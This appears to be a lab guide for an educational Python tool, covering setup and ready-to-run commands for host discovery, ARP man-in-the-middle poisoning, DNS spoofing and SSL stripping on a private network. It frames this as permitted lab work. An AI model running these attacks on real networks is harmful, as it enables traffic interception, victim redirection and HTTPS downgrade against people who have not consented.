# Lab Guide

This guide walks through setting up the project and running the CLI in both interactive and command-line modes.

## 1) Setup

```bash
cd educational_arp_dns_tool
python3 -m venv .venv
source .venv/bin/activate
pip install --upgrade pip
pip install scapy
```

Packet features require root:
```bash
sudo -s
```

## 2) Interactive CLI

Run the menu-based interface (no args):
```bash
sudo python3 -m tool.cli
```

Example menu:
```
1) discover
2) arp-demo
3) dns-demo
4) ssl-strip
```

Follow the prompts. Press Enter to accept defaults (including interface `eth0`).

## 3) Command-Line Examples

Discover hosts:
```bash
sudo python3 -m tool.cli discover -r 192.168.178.0/24
```

ARP MITM:
```bash
sudo python3 -m tool.cli arp-demo 192.168.178.10 192.168.178.1 -I eth0 -c 5 -i 1
```

DNS spoof:
```bash
sudo python3 -m tool.cli dns-demo example.com -s 192.168.178.76 -v 192.168.178.10 -I eth0
```

SSL strip (redirect):
```bash
sudo python3 -m tool.cli ssl-strip demo.local -b 192.168.178.76 -I eth0
```

SSL strip (custom HTML):
```bash
sudo python3 -m tool.cli ssl-strip demo.local -b 192.168.178.76 -I eth0 --html "<h1>test passed</h1>"
```

## 4) Lab Notes

- Use a host-only or private NAT network with explicit permission.
- HSTS-preloaded domains will not downgrade in SSL strip demos.
- Ensure the victim resolves the target host to your attacker IP (hosts file or DNS spoof) when testing `ssl-strip`.
